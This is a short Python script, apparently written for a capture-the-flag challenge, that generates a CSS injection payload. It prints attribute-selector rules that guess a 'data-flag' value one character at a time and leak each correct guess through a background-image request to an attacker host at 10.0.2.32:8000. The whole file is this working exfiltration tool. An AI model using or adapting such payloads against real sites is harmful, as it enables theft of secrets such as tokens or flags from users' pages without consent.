#!/usr/bin/env python3

import string

pref = input("prefix:")

test = "body {background-image: url(http://10.0.2.32:8000/trigger);}"
formatka = "#favourite-flag[data-flag^=wwi\{%sX] {background-image: url(http://10.0.2.32:8000/%sX);}"%(pref,pref)

print(test)
for c in string.ascii_letters + string.ascii_uppercase + string.digits:
    print(formatka.replace('X', c))
